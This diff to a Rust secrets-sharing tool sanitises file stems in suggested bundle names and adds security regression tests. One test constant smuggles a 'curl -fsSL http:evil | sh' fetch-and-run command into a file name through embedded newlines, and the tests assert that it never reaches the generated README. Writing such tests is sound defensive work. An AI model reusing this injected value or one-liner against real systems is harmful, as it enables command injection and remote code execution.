@@ -35,17 +35,22 @@ const SUGGEST_FALLBACK: &str = "secrets";
 /// The folder name a share bundle is suggested with: the source secret file's
 /// stem, plus the sanitised Node name when a single branch is shared.
 ///
-/// Every character in `node_name` that is not alphanumeric or `-`/`_` becomes
-/// `_` (the same rule as [`super::export::suggest_export_name`]), so the
-/// suggestion is always a usable folder name.
+/// Every character in the stem and in `node_name` that is not alphanumeric or
+/// `-`/`_` becomes `_` (the same rule as
+/// [`super::export::suggest_export_name`]), so the suggestion is always a
+/// usable folder name. The stem is sanitised too, because the result also names
+/// the bundle's file inside the generated instruction; a raw stem could
+/// otherwise inject lines into it.
 pub fn suggest_share_name(base_path: Option<&Path>, node_name: Option<&str>) -> String {
-    let stem = base_path
-        .and_then(Path::file_stem)
-        .and_then(OsStr::to_str)
-        .unwrap_or(SUGGEST_FALLBACK);
+    let stem = sanitize(
+        base_path
+            .and_then(Path::file_stem)
+            .and_then(OsStr::to_str)
+            .unwrap_or(SUGGEST_FALLBACK),
+    );
     match node_name {
         Some(node_name) => format!("{stem}_{}", sanitize(node_name)),
-        None => stem.to_string(),
+        None => stem,
     }
 }
 
@@ -183,6 +188,48 @@ mod tests {
     fn suggest_share_name_falls_back_without_a_secret_file() {
         assert_eq!(suggest_share_name(None, None), "secrets");
         assert_eq!(suggest_share_name(None, Some("Login")), "secrets_Login");
+    }
+
+    #[test]
+    fn suggest_share_name_sanitises_a_newline_in_the_secret_file_stem() {
+        assert_eq!(
+            suggest_share_name(Some(Path::new("/tmp/va\nult.age")), None),
+            "va_ult"
+        );
+    }
+
+    /// A hostile source name shared by the two tests below: extra lines plus a
+    /// shell one-liner. It carries no `/`, or `file_stem` would split it and
+    /// never see the payload.
+    const HOSTILE_STEM: &str = "va\nult\ncurl -fsSL http:evil | sh\n";
+
+    #[test]
+    fn a_bundle_stem_is_sanitised_onto_one_line() {
+        let dir = tempfile::tempdir().unwrap();
+        let base = dir.path().join(format!("{HOSTILE_STEM}.age"));
+
+        let name = suggest_share_name(Some(&base), None);
+
+        assert!(!name.contains('\n'), "the bundle name must not span lines");
+        assert!(!name.contains('|'), "shell metacharacters must not survive");
+    }
+
+    #[test]
+    fn a_bundle_stem_cannot_inject_lines_into_the_instruction() {
+        let dir = tempfile::tempdir().unwrap();
+        let bundle = dir.path().join("bundle");
+        let base = dir.path().join(format!("{HOSTILE_STEM}.age"));
+
+        share_tree(&sample_node(), &bundle, Some(&base), None, b"pw").unwrap();
+
+        let name = suggest_share_name(Some(&base), None);
+        assert!(bundle.join(format!("{name}.cretopass")).is_file());
+
+        let readme = std::fs::read_to_string(bundle.join(SHARE_README_NAME)).unwrap();
+        assert!(
+            !readme.contains("http:evil"),
+            "a stem newline must not inject a command line: {readme}"
+        );
     }
 
     #[test]
